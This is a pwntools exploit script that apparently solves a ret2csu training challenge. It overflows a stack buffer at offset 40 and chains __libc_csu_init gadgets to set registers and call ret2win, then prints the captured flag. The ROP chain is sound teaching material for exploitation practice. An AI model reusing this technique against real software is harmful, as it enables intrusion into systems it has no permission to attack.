#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2csu
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2csu')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x400796
b *0x4007b1
'''.format(**locals())
#b *0x400796

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

check_offset = False
if check_offset:
    io = start()
    io.sendline(cyclic(0xb0))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("stack: %#x", stack)
    pattern = core.read(stack, 4)
    offset = cyclic_find(pattern)
    info("pattern: %r", pattern)
    info("offset:  %d", offset)
    quit()

# Confirmed to be 40
OFFSET = 40

# CONSTANTS
system_plt = 0x4005a0
system_got = 0x601020
magic_param = 0xdeadcafebabebeef
ret2win = 0x4007b1

# GADGETS
#0x400576: ret;
null_ret = 0x400576


payload = fit({
    OFFSET: [
        p64(0x40089a),     # gadget1 from __libc_csu_init
        p64(0x0),          # rbx (needs to be 0 for second time through)
        p64(0x1),          # rbp (needs to be 1 for second time through)
        p64(0x600e38),     # r12 _init ptr from .dynamic. Doesn't touch RDX
        p64(0xdddddd),     # r13 (dummy value)
        p64(0xeeeeee),     # r14 (dummy value)
        p64(magic_param),  # r15
        p64(0x400880),     # gadget2 from __libc_csu_init
        p64(0x0),          # eaten in return
        p64(0x0),          # rbx 2nd time
        p64(0x0),          # rbp 2nd time
        p64(0x0),          # r12 2nd time
        p64(0x0),          # r13 2nd time
        p64(0x0),          # r14 2nd time
        p64(0x0),          # r15 2nd time
        p64(ret2win),      # finally!
    ]}, length=0xb0)

with open('payload.dat', 'wb') as out_file:
    out_file.write(payload)

io = start()
io.sendline(payload)
io.wait_for_close()
lines = io.recv().decode().split("\n")
flag = None
for line in lines:
    if 'flag' in line:
        flag = line
        break
success(flag)
